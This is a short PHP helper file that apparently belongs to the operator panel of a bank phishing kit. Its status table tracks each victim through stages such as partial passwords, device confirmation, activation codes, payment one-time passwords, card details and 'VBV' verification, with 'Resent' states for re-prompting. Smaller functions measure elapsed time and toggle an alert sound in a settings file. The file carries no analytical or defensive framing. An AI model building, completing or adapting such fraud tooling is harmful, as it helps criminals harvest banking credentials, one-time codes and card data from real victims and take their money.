<?php
// Status Table
function status_match($status) {
  switch ($status) {
    case 0:
      return 'Loading';
      break;
    case 1:
      return 'First 3 Password';
      break;
    case 2:
      return 'Device Confirmation';
      break;
    case 3:
      return 'Activation Code';
      break;
    case 4:
      return 'Payment Request';
      break;
    case 5:
      return 'Payment OTP';
      break;
    case 6:
      return 'Finished';
      break;
    case 8:
      return 'Finished (Mobile)';
      break;
    case 9:
      return 'Card Details';
      break;
    case 10:
      return 'VBV';
      break;
    case 11:
      return 'Last 3 Password';
      break;

    // Error Status'
    case 7:
      return 'Resent Login';
      break;
    case 12:
      return 'Resent OTP';
      break;
    case 13:
      return 'Resent Device Conf';
      break;
    case 14:
      return 'Resent Activation Code';
      break;
  }
}

// Compare Times
function compare_time($time) {
  return time() - $time;
}

// Handle sound
function get_sound() {
  $current = file_get_contents('../settings/sound_settings.txt');
  return $current;
}

function disable_sound() {
  file_put_contents('../settings/sound_settings.txt', "0");
}

function enable_sound() {
  file_put_contents('../settings/sound_settings.txt', "1");
}
?>
